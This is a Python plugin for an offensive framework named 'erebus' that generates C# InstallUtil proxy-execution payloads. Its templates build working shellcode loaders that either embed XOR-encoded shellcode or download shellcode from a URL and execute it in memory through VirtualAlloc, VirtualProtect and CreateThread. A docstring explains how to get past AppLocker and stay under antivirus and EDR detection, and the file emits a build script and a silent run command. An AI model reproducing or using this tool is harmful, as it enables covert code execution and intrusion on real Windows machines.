"""
InstallUtil trigger plugin (T1218.004).

Produces a C# source file with [RunInstallerAttribute(true)] and an overridden
Uninstall() method that executes shellcode. InstallUtil /U invokes Uninstall()
without requiring elevation:

    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe
        /logfile= /LogToConsole=false /U setup.exe

Two sub-modes:
  inline  - Shellcode bytes XOR-encoded and embedded directly in the C# source.
  staged  - Uninstall() downloads shellcode from a URL via WebClient.DownloadData().

OPSEC notes:
  - InstallUtil.exe is a .NET framework binary (signed Microsoft) that bypasses
    default AppLocker rules targeting unsigned executables.
  - /U (uninstall path) calls Uninstall() which does not trigger the standard
    installer UI; combined with /logfile= /LogToConsole=false it runs silently.
  - The spawned .NET runtime (clr.dll loaded into InstallUtil.exe) is visible to
    EDR; process-level .NET injection heuristics will fire.
  - Inline shellcode in .NET managed code will be JIT-compiled; keep the byte
    array under 16 KB to avoid IL size heuristics in some AV products.
  - If the builder cannot compile on the Docker host, the raw .cs source and a
    build.bat are emitted for Windows-side compilation.
"""

import os
import base64
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="InstallUtil Trigger",
        description="Produces an InstallUtil C# installer for proxy execution (T1218.004)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        supported_os=["Windows"],
    )
)


_CS_INLINE_TEMPLATE = """\
using System;
using System.Collections;
using System.ComponentModel;
using System.Runtime.InteropServices;

[RunInstaller(true)]
public class Setup : System.Configuration.Install.Installer
{{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private static byte[] _Decode(byte[] data, byte key)
    {{
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key);
        return result;
    }}

    public override void Uninstall(IDictionary savedState)
    {{
        // Encoded shellcode (XOR key: 0x{xor_key:02X})
        byte[] encoded = Convert.FromBase64String(
            "{b64_shellcode}"
        );
        byte[] sc = _Decode(encoded, 0x{xor_key:02X});

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint oldProt;
        VirtualProtect(mem, (uint)sc.Length, 0x20, out oldProt);
        uint tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out tid);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
"""

_CS_STAGED_TEMPLATE = """\
using System;
using System.Collections;
using System.ComponentModel;
using System.Net;
using System.Runtime.InteropServices;

[RunInstaller(true)]
public class Setup : System.Configuration.Install.Installer
{{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public override void Uninstall(IDictionary savedState)
    {{
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2
        byte[] sc;
        using (var wc = new WebClient())
        {{
            wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
            sc = wc.DownloadData("{shellcode_url}");
        }}

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint oldProt;
        VirtualProtect(mem, (uint)sc.Length, 0x20, out oldProt);
        uint tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, out tid);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }}
}}
"""

_BUILD_BAT_TEMPLATE = """\
@echo off
REM Compile InstallUtil installer on Windows
set CSC=%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
"%CSC%" /target:exe /out:setup.exe /r:System.Configuration.Install.dll setup.cs
echo Compiled: setup.exe
echo Run with:
echo   InstallUtil.exe /logfile= /LogToConsole=false /U setup.exe
"""

_INSTALL_UTIL = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"


def create_installutil_trigger(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate InstallUtil trigger artifacts.

    Args:
        payload_path: For inline mode: path to the raw shellcode file on the build host.
                      For staged mode: HTTP/S URL where shellcode will be hosted.
        output_dir:   Directory where output files are written.
        **kwargs:
            mode (str):    "inline" (default) or "staged".
            xor_key (int): XOR obfuscation key for inline mode. Default: 0x5E.

    Returns:
        dict with keys:
            cs_path    - absolute path to the .cs source file
            build_bat  - absolute path to the build.bat helper
            run_cmd    - InstallUtil.exe invocation command
            mode       - "inline" or "staged"
    """
    os.makedirs(output_dir, exist_ok=True)

    mode: str = str(kwargs.get("mode", "inline")).lower()
    xor_key: int = int(kwargs.get("xor_key", 0x5E)) & 0xFF

    cs_filename = "setup.cs"
    cs_path = os.path.join(output_dir, cs_filename)

    if mode == "staged":
        shellcode_url: str = payload_path
        cs_content = _CS_STAGED_TEMPLATE.format(shellcode_url=shellcode_url)
    else:
        # inline: read shellcode file, XOR-encode, base64
        if not os.path.isfile(payload_path):
            raise FileNotFoundError(
                f"Shellcode file not found for inline InstallUtil: {payload_path}"
            )
        with open(payload_path, "rb") as fh:
            raw = fh.read()
        encoded = bytes(b ^ xor_key for b in raw)
        b64 = base64.b64encode(encoded).decode("ascii")
        # Split into 76-char lines for readability inside the string literal.
        b64_lines = "\n            ".join(b64[i:i+76] for i in range(0, len(b64), 76))
        cs_content = _CS_INLINE_TEMPLATE.format(
            xor_key=xor_key,
            b64_shellcode=b64_lines,
        )

    with open(cs_path, "w", encoding="utf-8") as fh:
        fh.write(cs_content)

    build_bat_path = os.path.join(output_dir, "build_installutil.bat")
    with open(build_bat_path, "w", encoding="utf-8") as fh:
        fh.write(_BUILD_BAT_TEMPLATE)

    run_cmd = (
        f'"{_INSTALL_UTIL}" /logfile= /LogToConsole=false /U setup.exe'
    )

    return {
        "cs_path": cs_path,
        "build_bat": build_bat_path,
        "run_cmd": run_cmd,
        "mode": mode,
    }


def register():
    _plugin.register_function("create_installutil_trigger", create_installutil_trigger)
    return _plugin


def on_load():
    return register()
